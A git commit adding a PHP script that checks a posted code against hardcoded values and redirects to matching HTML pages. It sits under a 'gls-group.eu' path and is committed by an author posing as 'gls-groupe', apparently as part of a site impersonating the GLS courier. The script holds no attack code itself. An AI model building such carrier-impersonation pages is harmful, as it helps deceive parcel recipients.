dec8145661b47e8bbaab7f0ec78a8a224f7234e0
gls-groupe <gls-group@laposte.net>
2025-09-27 12:01:04 +0200

    Add files via upload

---
+++ gls-group.eu/FR/fr/controle.php
@@ -0,0 +1,142 @@
+<?php
+if(isset($_POST['pass']))
+{
+  if ($_POST['pass']=="1A04081941") header("Location: 1A04081941.html");
+  
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+				elseif($_POST['pass']=="xxxxxxxxxx")header("Location:xxxxxxxxxx.html");
+
+  
+  
+  
+  else header("Location: erreur.html");
+  
+}
+
+?>
+
+
+
